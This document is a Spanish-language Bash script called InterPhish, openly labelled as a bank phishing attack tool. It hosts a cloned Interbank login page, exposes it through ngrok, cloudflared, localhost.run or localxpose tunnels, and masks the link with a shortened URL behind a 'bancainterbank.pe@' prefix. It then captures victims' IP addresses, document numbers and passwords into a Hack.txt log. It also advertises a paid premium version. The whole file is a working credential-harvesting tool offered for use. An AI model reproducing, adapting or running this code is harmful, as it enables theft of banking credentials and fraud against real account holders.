#!/bin/bash
##################################
##     CREADO POR @edgarluck    ##
## * Inicio : 20/10/2024        ##
## * Actualizado : **/**/****   ##
##################################

luck=~/InterPhish
luck2=~/InterPhish/.server/bancainterbank.pe/login

#colors
R='\e[1;31m' # ROJO FUERTE
G='\e[1;32m' # verde fuerte
Y='\e[1;33m' # Amarillo fuerte
B='\e[1;34m' # Azul fuerte
M='\e[1;35m' # Purpura o algo asi
C='\e[1;36m' # Cyan fuerte
W='\e[1;37m' # Blanco fuerte
P='\e[1;35m' # Purpura
Green='\e[32m' # Verde
Gr='\e[5m\e[32m' # verde
Gris='\e[90m' # Gris

WG='\e[1;37m\e[42m'
reset='\e[0m'
WY='\e[1;37m\e[43m'
WR='\e[1;37m\e[41m'

r="\e[1;91m" # Rojo
g="\e[1;92m" # verde
y="\e[1;93m" #amarillo
w="\e[1;39m" #blanco
c="\e[1;96m" #cyan
b="\e[1;94m" #Azul
o="\e[1;33m" #naranja

trap ctrl_c 2
function ctrl_c {
echo
echo -e $B"[+]$W Finalizado"
echo -e $B"[+]$W Code by @edgarluck"
echo -e "$B[+]$W TP: https://t.me/edgarluck"
echo -e $B"[+]$W Telegram: https://t.me/Linux_Informatic"
killall ngrok > /dev/null 2>&1 &
killall php > /dev/null 2>&1 &
killall ssh > /dev/null 2>&1 &
killall cloudflared > /dev/null 2>&1 &
killall loclx > /dev/null 2>&1 &
echo
echo 
exit
}

banner2(){
  killall ngrok > /dev/null 2>&1 &
  killall php > /dev/null 2>&1 &
  killall proot > /dev/null 2>&1 &
  killall ssh > /dev/null 2>&1 &
  killall cloudflared > /dev/null 2>&1 &
  killall loclx > /dev/null 2>&1 &
	clear
echo -e ${G}
echo "		    ____      __            ____  __    _      __  "
echo "		   /  _/___  / /____  _____/ __ \/ /_  (_)____/ /_ "
echo "		   / // __ \/ __/ _ \/ ___/ /_/ / __ \/ / ___/ __ \/"
echo "		 _/ // / / / /_/  __/ /  / ____/ / / / (__  ) / / /"
echo "		/___/_/ /_/\__/\___/_/  /_/   /_/ /_/_/____/_/ /_/ "
                                                   

echo -e "        ${WR}$reset Herramienta De Ataque de Phishing - Bancos       ${W} version 1.1$reset"
echo -e "	${Y}   c${W}o${Y}d${W}e${Y} b${W}y${Y} @${W}e${Y}d${W}g${Y}a${W}r${Y}l${Y}u${W}c${Y}k"
echo
echo -e "        ${WG} .: https://github.com/edgarluck :.$reset"

}

update(){
clear
echo -e "$G[$W+$G]$W Comprobando actualizaciones ..."
sleep 0.5
echo -e "$G[$W+$G]$W Comprobando actualizaciones ..."
sleep 0.5
OS=$(uname -o)
if [ "${OS}" == "Android"] ; then
apt install -qq -y wget > /dev/null 2>&1
fi
if [[ -f version.txt ]] ; then
rm version.txt
fi
wget https://raw.githubusercontent.com/edgarluck/InterPhish/main/version.txt
sleep 0.5
clear
version=$(cat version.txt)
versionactual="1.1"
case `cat version.txt` in
1.1)
delete
delete2
delete3
delete4
depen
menu
;;
*)
banner2
echo
echo
echo -e "$G[$W+$G]$w NUEVA VERSION " 
sleep 0.5
echo -e "$G[$W+$G]"
sleep 0.5
echo -e "$G[$W+$G]$W NUEVA$C:$G $version"
sleep 0.5
echo -e "$G[$W+$G]"
sleep 0.5
echo -e "$G[$W+$G]$W ACTUAL$C:$G $versionactual"
sleep 0.5
echo -e "$G[$W+$G]"
sleep 0.5
update2
;;
esac
}
update2(){
echo -e -n "$G[$W+$G] ACTUALIZAR$W ? $G Y $W/$R N${G} :${W} "
read atc
case $atc in
Y)
if [[ -f version.txt ]]; then
rm version.txt
fi
if [[ -f cambios.txt ]]; then
rm changes.txt
fi
sleep 1
wget https://raw.githubusercontent.com/edgarluck/InterPhish/main/cambios.txt
sleep 0.5
cambio=$(cat cambios.txt)
cd $HOME && rm -rf InterPhish && git clone https://github.com/edgarluck/InterPhish && cd InterPhish
clear
banner2
echo
echo
echo -e "$G[$W+$G]"
echo -e "$G[$W+$G]$W Cambios$G: $B"
sleep 0.5
echo -e "$cambio"
if [[ -f cambios.txt ]] ; then
rm cambios.txt
fi
if [[ -f version.txt ]]; then
rm version.txt
fi
echo -e "$G[$W+$G]$W Pulsa cualquier tecla para continuar...."
read
cd $HOME && cd InterPhish
bash interphish.sh
;;
y)
if [[ -f version.txt ]]; then
rm version.txt
fi
wget https://raw.githubusercontent.com/edgarluck/InterPhish/main/cambios.txt
sleep 0.5
cambio=$(cat changes.txt)
cd $HOME && rm -rf InterPhish && git clone https://github.com/edgarluck/InterPhish && cd InterPhish
clear
banner2
echo
echo
echo -e "$G[$W+$G]"
echo -e "$G[$W+$G]$W Cambios$G: $B"
sleep 0.5
echo -e "$cambio"
if [[ -f cambios.txt ]] ; then
rm cambios.txt
fi
if [[ -f version.txt ]]; then
rm version.txt
fi
echo -e "$G[$W+$G]$W Pulsa cualquier tecla para continuar...."
read
cd $HOME && cd InterPhish
bash interphish.sh
;;
N)
echo
echo
echo -e "$R[$Y!!$R] No se Actualizo .... :("
sleep 1
exit
;;
n)
echo
echo
echo -e "$R[$Y!!$R] No se Actualizo .... :("
sleep 1
exit
;;
*)
echo
echo
echo -e "$R[$Y!!$R] Pulsa Y para Actualizar .... :("
sleep 3
bash interphish.sh
;;
esac
}

function menu {
	banner2
	echo
	echo
echo -e "         [ ${W}01$G ] Iniciar Phishing"
echo -e "         [ ${W}02$G ] Canal de Youtube && Suscribete"
echo -e "         [ ${W}03$G ] Posible solución al no generar enlace"
echo -e "         [ ${W}04$G ] GitHub"
echo -e "         [ ${W}05$G ] Grupo de Telegram"
echo -e "         [ ${W}06$G ] Beneficios al comprar la herramienta premium"
echo -e "         [ ${W}07$G ] Contacto con el desarrollador"
echo -e "         [ ${W}08$G ] Menu"
echo -e "         [${W}help$G] Ayuda"
echo
echo 
ocp
}
function TUNNEL {
if [[ -f $luck2/tunel.log ]]; then
	echo
echo -e "N* Tunnel Disponibles       Estado"
echo -e "-- ------------------       ------"
if [[ $(cat $luck2/tunel.log|grep ngrok) == "ngrok" ]];then
        echo -e "${G}01.  ngrok                 ${R}Seleccionado"
else
        echo -e "${G}01.  ngrok                 Disponible"
fi
if [[ $(cat $luck2/tunel.log|grep ssh.localhost.run) == "ssh.localhost.run" ]]; then
    echo -e "${G}02.  ssh.localhost.run     ${R}Seleccionado"
  else
    echo -e "${G}02.  ssh.localhost.run     Disponible"${R}
fi
if [[ $(cat $luck2/tunel.log|grep cloudflared) == "cloudflared" ]]; then
	echo -e "${G}03.  cloudflared           ${R}Seleccionado"
else
	echo -e "${G}03.  cloudflared           Disponible"${R}
fi
if [[ $(cat $luck2/tunel.log|grep localxpose) == "localxpose" ]]; then
	echo -e "${G}04.  localxpose            ${R}Seleccionado"
else
	echo -e "${G}04.  localxpose            Disponible"${R}
	echo
fi
else
  	echo
echo -e "N* Tunnel Disponibles       Estado"
echo -e "-- ------------------       ------"
echo -e "${G}01.  ngrok                 Disponible"
echo -e "${G}02.  ssh.localhost.run     Disponible"${R}
echo -e "${G}03.  cloudflared           Disponible"${R}
echo -e "${G}04.  localxpose            Disponible"${R}
echo
fi
}

function FOTO {
if [[ -f "$luck2/foto" ]]; then
echo -e "$G-----------------------------"
echo -e "$W      FOTOS AGREGADOS"
echo -e "$G-----------------------------"
echo
echo -e "${G}ADD_FOTO$W : $(cat $luck2/foto)"
echo
else
echo -e "$G-----------------------------"
echo -e "$W      FOTOS AGREGADOS"
echo -e "$G-----------------------------"
echo
echo -e "${G}ADD_FOTO$W : "
echo
fi
}

###################
##    AYUDA      ##
###################
function menuface {
echo
echo -e "${G} ===================="
echo -e "${W} InterPhish V.1.1"
echo -e "${G} ===================="
echo 
echo -e "${W} Nº red social                Detalles"
echo -e "${G} -- ----------                --------"
echo
echo -e " 1.${W} banco interbank           Plantilla del Banco Interbank"
echo
echo -e "${C} uso :${W} set red banco [interbank] (ejemplo)"
echo
ocp
}


function ocp {
echo -e -n "$W[ phishing ] > "
read -r E L T U
case $E in
	1|01)
	if [[ -f $luck2/ruta.log ]]; then
	source $luck2/ruta.log
	else
	echo -e "$R[$Y !! $R] Falta agregar red facebook ... :("
	sleep 0.5
	ocp
	fi
      if [[ -f "$luck2/edgar.log" ]]; then
      source $luck2/edgar.log
      else
      echo -e "$R[$Y!!$R] Falta agregar su tunnel :("
      sleep 0.5
      ocp
      fi
	  interaccion
	  stop
	  ;;
	2|02)
		OS=$(uname -o)

                if [ "$OS" == "Android" ]; then
                        BIN="/data/data/com.termux/files/usr/bin"
                        APT="pkg"
                termux-open https://youtube.com/channel/UCVCklEUJuOhydbySEbY5_eA
		ocp
                OS=$(uname -o)

                elif [ "$OS" == "GNU/Linux" ]; then
                        BIN="/bin"
                        APT="sudo apt-get"
                echo -e "${G}Canal de Youtube$W =>$Y https://youtube.com/channel/UCVCklEUJuOhydbySEbY5_eA"
                fi
		ocp
		;;
	3|03)
		echo
		echo
		echo -e "$C=============================="
		echo -e "${W}1.${G} Cuando usa datos moviles"
		echo -e "$C=============================="
		echo 
		echo -e "${G} Si usted esta usando datos moviles"
		echo -e " tener Activado la red hostpot, osea "
		echo -e " activar la opcion donde se comparte"
		echo -e " el wifi del dispositivo${W}."
		echo
		echo
		ocp
		;;
	4|04)
		OS=$(uname -o)

                if [ "$OS" == "Android" ]; then
                        BIN="/data/data/com.termux/files/usr/bin"
                        APT="pkg"
                termux-open https://github.com/edgarluck/
		ocp
                OS=$(uname -o)

                elif [ "$OS" == "GNU/Linux" ]; then
                        BIN="/bin"
                        APT="sudo apt-get"
                echo -e "${G}GIT HUB$W => ${Y}https://github.com/edgarluck/"
                fi
		ocp
		;;
	5|05)
		OS=$(uname -o)

                if [ "$OS" == "Android" ]; then
                        BIN="/data/data/com.termux/files/usr/bin"
                        APT="pkg"
                termux-open https://t.me/Linux_Informatic
		ocp
                OS=$(uname -o)

                elif [ "$OS" == "GNU/Linux" ]; then
                        BIN="/bin"
                        APT="sudo apt-get"
                echo -e "${G}Grupo de Telegram ${W}=>$Y https://t.me/Linux_Informatic"
                fi
		ocp
		;;
	6|06)
		echo 
		echo
		echo -e "$C============================"
		echo -e "${G}BENEFICIOS DE LA HERRAMIENTA"
		echo -e "         PREMIUM"
		echo -e "$C============================"
		echo 
		echo -e "${W}1.${G} Se le brinda soporte y atencion"
		echo -e "   en los errores que presenta el"
		echo -e "   usuario"
		echo -e "${W}2.${G} Permite al usuario personalizar"
		echo -e "   el enlace${W}:"
        echo
		echo -e " ${W} *${G} Agregar una Imagen al enlace"
		echo -e " ${W} *${G} Agregar un titulo"
		echo -e " ${W} *${G} Agregar una descripcion"
		echo -e " ${W} *${G} Agregar un dominio"
		echo -e " ${W} *${G} Personalizar el acortador"
		echo -e " ${W} *${G} Redireccionar a otra pagina"
		echo -e "    A la victima"
		echo -e " ${W} *${G} Se ira agregando mas tunnel"
		echo -e "    (Por el momento esta en"
		echo -e "    desarrolo)"
        echo 
		echo -e "${W}3.${G} Contactame si desea adquirirlo :"
        echo
        echo -e "${W}  *${C} Telegram ==>${W} https://t.me/edgarluck"
        echo -e "${W}  *${G} WhatsApp ==>${W} +51 938454671"
        echo
		echo
		ocp
		;;
	7|07)
		echo 
		echo
		echo -e "$C=========================="
		echo -e "${G}CONTACTO DEL DESARROLLADOR"
		echo -e "$C=========================="
		echo 
		echo -e "${C}Telegram ==> https://t.me/edgarluck"
		echo -e "${G}WhatsApp ==> +51 938454671"
		echo
		echo
		ocp
		;;
	8|08)
		menu
		;;
      "show")
        ;;
      "set")
        ;;
      "help")
        echo -e "${G} ===================="
        echo -e "${W}     MENU DE AYUDA"
        echo -e "${G} ===================="
        echo
        echo -e "${W} Comandos              Description"
        echo -e "${G} --------              -----------"
        echo
        echo -e "${W} show red bank       Muestra las plantillas"
        echo
        echo -e "${W} set red banco      Selecciona las plantillas:" 
        echo -e "             <options>     "
        echo
        echo -e "                       <interbank>"
        echo
        echo -e "                       Ejem.: set red banco interbank"
        echo
        echo -e "${G}------------------------------------------------------"
        echo
	echo -e "${W} show foto             Muestra la foto agregada"
	echo
	echo -e " set add_foto url <ENLACE>"
	echo
        echo -e "             	       En 'ENLACE' reemplazas por"
	echo -e "                       la URL de la IMAGEN , que"
	echo -e "                       terminen en .png"
	echo
	echo -e "${G}------------------------------------------------------"
	echo
        echo -e "${W} show tunnel           Muestra los servidores"
        echo 
        echo -e " set ltunnel <options> Selecciona el servidor"
        echo -e "                       opctions:"
	echo
        echo -e "                       <ngrok> <ssh.localhost.run> <cloudflared> "
	echo -e "                       <localxpose>"
	echo
	echo -e "                       Ejem.:  set ltunnel ngrok" 
        echo
        echo -e "${G}------------------------------------------------------"
        echo
        ;;
	*)
		if [[ "$E" != "" ]]; then
		echo -e "$R[${Y}!!$R] Comando invalido: ${E}"
        	sleep 0.5
            ocp
        	else
        	ocp
        	fi
		;;
esac
case $L in
  "tunnel")
    TUNNEL
    ocp
    ;;
  "ltunnel")
    ;;
  "add_foto")
    ;;
  "foto")
    FOTO
    ocp
    ;;
  "red")
    ;;
    *)
	if [[ "${L}" != "" ]]; then
	echo -e "$R[${Y}!!$R] Comando invalido: ${L}"
        ocp
	else
	ocp
	fi
	;;
	esac
case $T in
  "ngrok")
    delete
    delete2
    echo "Ngrok" >> $luck2/edgar.log
    echo "ngrok" >> $luck2/tunel.log
    sleep 0.5
    mo="ngrok"
    echo -e "$G[+]$B Tunnel$G ==>$W $mo"
    ocp
    ;;
  "ssh.localhost.run")
    delete
    delete2
    echo "SSH-LOCALHOST-RUN" >> $luck2/edgar.log
    echo "ssh.localhost.run" >> $luck2/tunel.log
    sleep 0.5
    mo="ssh.localhost.run"
    echo -e "$G[+]$B Tunnel$G ==>$W $mo"
    ocp
    ;;
"cloudflared")
	delete
	delete2
	echo "CLOUDFLARED" >> $luck2/edgar.log
	echo "cloudflared" >> $luck2/tunel.log
	sleep 0.5
	mo="cloudflared"
	echo -e "$G[+]$B Tunnel$G ==>$W $mo"
	ocp
	;;
"localxpose")
	delete
	delete2
	echo "LOCALXPOSE" >> $luck2/edgar.log
	echo "localxpose" >> $luck2/tunel.log
	sleep 0.5
	mo="localxpose"
	echo -e "$G[+]$B Tunnel$G ==>$W $mo"
	ocp
	;;
"url")
	;;
"banco")
	;;
"bank")
	menuface
	ocp
	;;
    *)
	if [[ "${T}" != "" ]]; then
	echo -e "$R[${Y}!!$R] Tunnel incorrecto: ${T}"
        ocp
	else
	ocp
	fi
	;;
	esac
case $U in
	"interbank")
	echo "cd $luck2" > $luck2/ruta.log
	sleep 0.5
	red="interbank"
	echo -e "$G[$W+$G]$B red banco $G==>$W $red"
	sleep 0.5
	ocp
;;
*)	
	if [[ "${U}" != "" ]]; then
	add="$U"
	echo "${U}" > $luck2/foto
	if wget --spider $U 2>/dev/null; then 
	sleep 0.5
	if [[ -f $luck2/ruta.log ]]; then	
	echo -e "$G[+]$B A
	DD_FOTO $G==>$W $U"        
        source $luck2/ruta.log
	agrep="<meta property='og:image' content='${add}' />"
        sed -i "/<meta property='og:image' content='.*'/d" index.html
        sed -i '11i '"$agrep"'' index.html
        else
        sleep 0.5
        echo -e "$R[$Y !! $R] Falta agregar red facebook ... :("
        sleep 0.5
        ocp
        fi
	sleep 2
	ocp
	else
	sleep 0.5
	echo -e "$R[$Y+$R] Falta agregar la URL de la FOTO o solo es un archivo local$Y !!"
	if [[ -f "$luck2/foto" ]]; then  
	rm $luck2/foto
	fi
	ocp
	fi
	else
	echo -e "$R[$Y!!$R] Comando incompleto$Y !!"
	ocp
	fi
	;;

esac

}

stop() {
  killall ngrok > /dev/null 2>&1 &
  killall php > /dev/null 2>&1 &
exit 1

}
depen() {
printf "\e[1;92m"
command -v php > /dev/null 2>&1 || { echo -e >&2 "Requiero php. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v curl > /dev/null 2>&1 || { echo -e >&2 "Requiero curl. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v ngrok > /dev/null 2>&1 || { echo -e >&2 "Requiero ngrok. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo -e >&2 "Requiero openssh. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v proot resolv-conf > /dev/null 2>&1 || { echo -e >&2 "Requiero proot. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v cloudflared > /dev/null 2>&1 || { echo -e >&2 "Requiero cloudflared. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }

}
ssh-localhost-run(){
ssh -R 80:localhost:$LPORT nokey@localhost.run > ssh-url.log
}
SSH-LOCALHOST-RUN(){
echo -e "$G[+]$W Iniciando servidores..."
sleep 2
LPORT=$(shuf -i 1111-9999 -n 1)
echo -e "$G[+]$W Abriendo servidor php..."
php -S 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 3
echo -e "$G[+]$W Abriendo servidor local.."
sleep 3
echo -e "$G[+]$W Abriendo servidor ssh.localhost.run..."
sleep 3
if [ ! -f ~/.ssh/id_rsa.pub ]; then
echo -e "$R[-] Error : Falta agregar la llave de cifrado para conexiones ssh"
echo -e "$R[+] Ejecuta : ssh-keygen -t rsa"
echo
exit
fi
ssh-localhost-run > /dev/null 2>&1 &
sleep 10
link=$(cat ssh-url.log| grep   -o 'https://[a-z0-9-]\{2,4\}\+.lhr.life')
sleep 1
echo -e "$G[+]$W Capturando las URLs..."
sleep 2
echo -e "$G[+]$W Envia a la victima --> http://localhost:$LPORT"
sleep 0.9
if [ -z $link ]; then
echo -e "$R[${Y}+$R] Error. Hay un error con ssh.localhost.run... :("
exit 
else
echo -e "$G[+]$W Envia a la victima --> $link"
fi
sleep 0.9
text="bancainterbank.pe"
WORDS=$(echo -e "${text}" | tr ' ' ' - ')
SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
echo -e "${SHORT}" >> url.txt
PROTOCOL=$(cut -d "/" -f1 url.txt)
DOMAIN=$(cut -d "/" -f4 url.txt)
CUSTOM="${PROTOCOL}//${WORDS}@is.gd/${DOMAIN}"
rm url.txt
echo -e "$G[+]$W Envia a la victima --> ${CUSTOM}"
sleep 0.9
echo
echo -e "$G[+]$W Interactuando con la victima..$W"
rm ssh-url.log
}
Ngrok(){
echo -e "$G[+]$W Iniciando servidores..."
sleep 2
LPORT=$(shuf -i 1111-9999 -n 1)
echo -e "$G[+]$W Abriendo servidor php..."
php -S 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 4
sleep 3
echo -e "$G[+]$W Abriendo servidor ssh..."
sleep 3
echo -e "$G[+]$W Abriendo servidor local.."
sleep 3
echo -e "$G[+]$W Abriendo servidor ngrok..."
sleep 3
OS=$(uname -o)
if [ "${OS}" == "Android" ]; then
  termux-chroot ngrok http $LPORT > /dev/null 2>&1 &
elif [ "${OS}" == "GNU/Linux" ]; then
  ngrok http $LPORT > /dev/null 2>&1 &
fi
sleep 8
link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]\+.app')
link1=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'http://[^"]\+.app')
sleep 1
echo -e "$G[+]$W Capturando las URLs..."
sleep 2
echo -e "$G[+]$W Enlace Local       --> http://localhost:$LPORT"
sleep 0.9
if [ -z $link ]; then
	echo -e "$R[${Y}+$R] Error. Hay un error con ngrok... :("
	exit 
else
echo -e "$G[+]$W Envia a la victima --> $link1"
sleep 0.5
echo -e "$G[+]$W Envia a la victima --> $link"
fi
sleep 0.9
text="bancainterbank.pe"
WORDS=$(echo -e "${text}" | tr ' ' ' - ')
SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
echo -e "${SHORT}" >> url.txt
PROTOCOL=$(cut -d "/" -f1 url.txt)
DOMAIN=$(cut -d "/" -f4 url.txt)
CUSTOM="${PROTOCOL}//${WORDS}@is.gd/${DOMAIN}"
rm url.txt
echo -e "$G[+]$W Envia a la victima --> ${CUSTOM}"
sleep 0.9
echo 
echo -e "$G[+]$W Interactuando con la victima..$W"
}
CLOUDFLARED(){
echo -e "$G[+]$W Iniciando servidores..."
sleep 2
LPORT=$(shuf -i 1111-9999 -n 1)
echo -e "$G[+]$W Abriendo servidor php..."
php -S 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 3
echo -e "$G[+]$W Abriendo servidor ssh..."
sleep 3
echo -e "$G[+]$W Abriendo servidor local.."
sleep 3
echo -e "$G[+]$W Abriendo servidor cloudflared..."
sleep 3
OS=$(uname -o)
if [ "${OS}" == "Android"] ; then
termux-chroot cloudflared tunnel -url 127.0.0.1:$LPORT --logfile log.txt > /dev/null 2>&1 &
elif [ "${OS}" == "GNU/Linux" ]; then
cloudflared tunnel -url 127.0.0.1:$LPORT --logfile log.txt > /dev/null 2>&1 &
fi
sleep 10
link=$(cat log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
sleep 1
echo -e "$G[+]$W Capturando las URLs..."
sleep 2
echo -e "$G[+]$W Envia a la victima --> http://localhost:$LPORT"
sleep 0.9
sleep 0.9
if [ -z $link ]; then
        echo -e "$R[${Y}+$R] Error. Hay un error con cloudflared... :("
        exit 
else
echo -e "$G[+]$W Envia a la victima --> $link"
fi
sleep 0.9
text="bancainterbank.pe"
WORDS=$(echo -e "${text}" | tr ' ' ' - ')
SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
echo -e "${SHORT}" >> url.txt
PROTOCOL=$(cut -d "/" -f1 url.txt)
DOMAIN=$(cut -d "/" -f4 url.txt)
CUSTOM="${PROTOCOL}//${WORDS}@is.gd/${DOMAIN}"
rm url.txt
echo -e "$G[+]$W Envia a la victima --> ${CUSTOM}"
sleep 0.9
echo
echo -e "$G[+]$W Interactuando con la victima..$W"
rm log.txt
}
LOCALXPOSE(){
echo -e "$G[+]$W Iniciando servidores..."
sleep 2
LPORT=$(shuf -i 1111-9999 -n 1)
echo -e "$G[+]$W Abriendo servidor php..."
php -S 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 3
echo -e "$G[+]$W Abriendo servidor ssh..."
sleep 3
echo -e "$G[+]$W Abriendo servidor local.."
sleep 3
echo -e "$G[+]$W Abriendo servidor localxpose..."
sleep 3
loclx tunnel --raw-mode http --region us --https-redirect -t 127.0.0.1:$LPORT > log.txt 2>&1 &
sleep 13
link=$(cat log.txt | grep -o '[-0-9a-z]*\.loclx.io')
sleep 1
echo -e "$G[+]$W Capturando las URLs..."
sleep 2
echo -e "$G[+]$W Envia a la victima --> http://localhost:$LPORT"
sleep 0.9
sleep 0.9
if [ -z $link ]; then
        echo -e "$R[${Y}+$R] Error. Hay un error con localxpose... :("
        exit
else
echo -e "$G[+]$W Envia a la victima --> $link"
fi
sleep 0.9
text="bancainterbank.pe"
WORDS=$(echo -e "${text}" | tr ' ' ' - ')
SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
echo -e "${SHORT}" >> url.txt
PROTOCOL=$(cut -d "/" -f1 url.txt)
DOMAIN=$(cut -d "/" -f4 url.txt)
CUSTOM="${PROTOCOL}//${WORDS}@is.gd/${DOMAIN}"
rm url.txt
echo -e "$G[+]$W Envia a la victima --> ${CUSTOM}"
sleep 0.9
echo
echo -e "$G[+]$W Interactuando con la victima..$W"
rm log.txt
}


interaccion(){
while [ True ]; do
if [[ -e ip.txt ]]; then
printf "$G[+]$W #######"
sleep 0.6
printf "##########"
sleep 0.5
printf "############\n"
sleep 1
sleep 2
echo -e "$G[+]$W"
echo -e "$G[+]$W La victima accedio al enlace :).."
sleep 4
echo -e "$G[+]$W"
ip=$(grep -a 'IP :' ip.txt | cut -d " " -f3 | tr -d '\r')
sleep 2
echo -e "$G[+]$W Dirección IP =$Gren $ip"
sleep 1
NA=$(cat ip.txt|grep User-Agent  | cut -d ":" -f2)
sleep 1
echo -e "$G[+]$W"
sleep 1
echo -e "$G[+]$W Agente Utilizado =$Gren $NA"
sleep 1
echo -e "$G[+]$W"
if [ ! -e $luck/Hack.txt ]; then
touch $luck/Hack.txt
fi
echo "[+] ########################################" >> $luck/Hack.txt
echo "[+] Fecha: $(date)" >> $luck/Hack.txt
echo "[+] Obtenido de Face-Phish " >> $luck/Hack.txt
echo "[+] Direcciòn IP = $ip" >> $luck/Hack.txt
echo "[+] Agente Utilizado = $NA" >> $luck/Hack.txt
rm ip.txt
sleep 2
fi
if [ -e datos.txt ]; then
sleep 1
echo -e "$G[+]$W"
echo -e "$G[+]$W Clave que la victima coloco :)"
sleep 1
echo -e "$G[+]$W"
#sed -i "37d" $luck2/datos.txt
#sleep 1
#sed -i "20,45d" $luck2/datos.txt
#sleep 1
tipo=$(cat datos.txt|grep dniType | cur -d "=" -f2)
target=$(cat datos.txt|grep TypeDocument | cut -d "=" -f2)
clave=$(cat datos.txt|grep password | cut -d "=" -f2)
sleep 1
echo -e "$G[+]$W Tipo de Documento =$Gren $tipo"
echo -e "$G[+]$W Documento =$Gren $target"
echo -e "$G[+]$W Contraseña =$Gren $clave"
echo "[+] Documento = $target" >> $luck/Hack.txt
echo "[+] COntraseña = $clave" >> $luck/Hack.txt
echo "[+] Tipo de documento = $tipo" >> $luck/Hack.txt
echo -e "$G[+]$W"
rm datos.txt
sleep 1
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "#############"
sleep 1
echo -e "\n$G[+]$W Interactuando con la victima...$W"
echo -e "$G[+]$W"
fi
done
}
function  delete {
if [[ -f "$luck2/edgar.log" ]]; then
  rm $luck2/edgar.log
fi
}
function  delete2 {
if [[ -f "$luck2/tunel.log" ]]; then
  rm $luck2/tunel.log
fi
}
function delete3 {
if [[ -f "$luck2/foto" ]]; then  
rm $luck2/foto
fi
}
function delete4 {
if [[ -f "$luck2/ruta.log" ]]; then  
rm $luck2/ruta.log
fi
}

update
